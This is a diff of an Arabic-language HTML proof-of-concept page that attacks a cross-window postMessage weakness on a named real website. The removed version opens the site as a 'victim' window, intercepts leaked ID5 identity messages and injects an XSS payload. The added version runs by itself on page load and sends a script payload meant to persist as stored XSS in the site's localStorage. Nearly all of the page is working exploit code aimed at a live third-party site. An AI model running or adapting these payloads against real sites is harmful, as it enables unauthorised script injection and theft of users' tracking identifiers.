@@ -2,123 +2,58 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إثبات اختراق أمنيغ - ثغرة postMessage</title>
+    <title>اختبار الثغرة المخزنة (Stored XSS Test)</title>
     <style>
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #0d0d0d;
-            color: #00ff00;
-            padding: 20px;
-            line-height: 1.6;
-        }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            border: 1px solid #333;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
-        }
-        h1 { border-bottom: 2px solid #00ff00; padding-bottom: 10px; color: #fff; }
-        .btn {
-            background-color: #ff0000;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 1.1em;
-            display: block;
-            width: 100%;
-            margin: 20px 0;
-            transition: 0.3s;
-        }
-        .btn:hover { background-color: #b30000; box-shadow: 0 0 15px #ff0000; }
-        #log {
-            background-color: #000;
-            border: 1px solid #444;
-            padding: 15px;
-            height: 400px;
-            overflow-y: scroll;
-            font-size: 0.9em;
-            color: #00ff00;
-        }
-        .intercepted-data { color: #ff00ff; font-weight: bold; }
-        .status-msg { color: #aaa; }
+        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
+        .status { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
+        .detected { color: #ff00ff; font-weight: bold; }
     </style>
 </head>
 <body>
+    <h2>جاري فحص إمكانية تحويل الثغرة إلى Stored...</h2>
+    <div id="status" class="status">بدء العملية...</div>
+    <div id="logs"></div>
 
-<div class="container">
-    <h1>هجوم استغلال ثغرة postMessage</h1>
-    <p class="status-msg">هذه الصفحة تقوم بمحاكاة هجوم حقيقي لسحب بيانات المستخدم (Identity Theft) وحقن كود (XSS).</p>
-    
-    <button class="btn" onclick="launchAttack()">تشغيل الهجوم (Launch Exploit)</button>
+    <script>
+        let victimWindow;
+        const log = (msg, isSpecial = false) => {
+            const div = document.getElementById('logs');
+            div.innerHTML += `<p class="${isSpecial ? 'detected' : ''}">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
+        };
 
-    <h3>سجل العمليات (Attack Log):</h3>
-    <div id="log">في انتظار بدء الهجوم...</div>
-</div>
+        // 1. تشغيل الهجوم
+        function launchStoredTest() {
+            log("فتح نافذة الضحية...");
+            victimWindow = window.open("https://www.webmd.com", "VictimSite");
 
-<script>
-    const logBoard = document.getElementById('log');
-    let victimWindow;
+            setTimeout(() => {
+                log("محاولة حقن كود تتبع في التخزين المحلي (LocalStorage)...");
+                
+                // الـ Payload هنا يحاول كتابة نفسه داخل الـ LocalStorage الخاص بالضحية
+                const payload = {
+                    _isId5Message: true,
+                    type: "ID5_STORAGE_UPDATE", 
+                    payload: {
+                        // كود يحاول التنفيذ وتخزين نفسه
+                        identity: "STORED_XSS_TEST_DATA",
+                        scripts: "<script>localStorage.setItem('hacked', 'true'); console.log('Stored Successful');<\/script>"
+                    }
+                };
 
-    function addToLog(msg, isData = false) {
-        const p = document.createElement('div');
-        p.className = isData ? 'intercepted-data' : 'status-msg';
-        p.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logBoard.appendChild(p);
-        logBoard.scrollTop = logBoard.scrollHeight;
-    }
+                victimWindow.postMessage(payload, "*");
+                log("تم إرسال الـ Payload. انتظر 10 ثوانٍ...");
+            }, 5000);
 
-    function launchAttack() {
-        // 1. تحديد هدف الضحية (استبدل الرابط بموقع الضحية المصاب)
-        const victimUrl = "https://www.webmd.com"; 
-        
-        addToLog("جاري محاولة فتح نافذة الضحية: " + victimUrl);
-        
-        // 2. فتح النافذة
-        victimWindow = window.open(victimUrl, "VictimWindow");
-
-        if (!victimWindow) {
-            addToLog("!!! خطأ: المتصفح حظر النافذة المنبثقة. يرجى تفعيل Popups.");
-            return;
+            // 2. فحص الاستجابة (هل الموقع سرب البيانات المخزنة؟)
+            window.addEventListener("message", (event) => {
+                if (event.data && JSON.stringify(event.data).includes("STORED_XSS_TEST_DATA")) {
+                    log("!!! تأكيد: الموقع استقبل البيانات وقام بمعالجتها !!!", true);
+                    log("الآن قم بتحديث صفحة الضحية يدوياً، إذا وجدنا 'hacked' في الـ LocalStorage فهي Stored!");
+                }
+            });
         }
 
-        addToLog("تم فتح النافذة بنجاح. في انتظار بث البيانات من الكود المصاب...");
-
-        // 3. مستمع الأحداث لاعتراض الرسائل المسربة
-        window.addEventListener("message", (event) => {
-            // التحقق من أن الرسالة تحمل وسم ID5 المصاب
-            if (event.data && event.data._isId5Message) {
-                addToLog("SUCCESS: تم اعتراض رسالة مسربة!");
-                addToLog("البيانات المستخرجة: " + JSON.stringify(event.data), true);
-                
-                // هنا المهاجم يرسل البيانات لسيرفره الخاص
-                console.log("Captured Global ID:", event.data.src);
-            }
-        });
-
-        // 4. إرسال الـ Payload المفخخ بعد تحميل الموقع (5 ثوانٍ)
-        setTimeout(() => {
-            addToLog("جاري محاولة حقن الـ Payload (XSS/State Poisoning)...");
-            
-            const payload = {
-                _isId5Message: true,
-                src: "attacker-fake-id",
-                type: "PROXY_METHOD_CALL",
-                payload: {
-                    name: "process",
-                    args: ["<img src=x onerror=\"alert('تم الاختراق!\\nالمجال: ' + document.domain + '\\nالمعرف المسروق: ' + event.data.src);\">"]
-                }
-            };
-
-            // استغلال الثغرة الكبرى (استخدام النجمة *)
-            victimWindow.postMessage(payload, "*");
-            addToLog("تم إرسال الـ Payload عبر القنوات المفتوحة.");
-        }, 5000);
-    }
-</script>
-
+        window.onload = launchStoredTest;
+    </script>
 </body>
 </html>
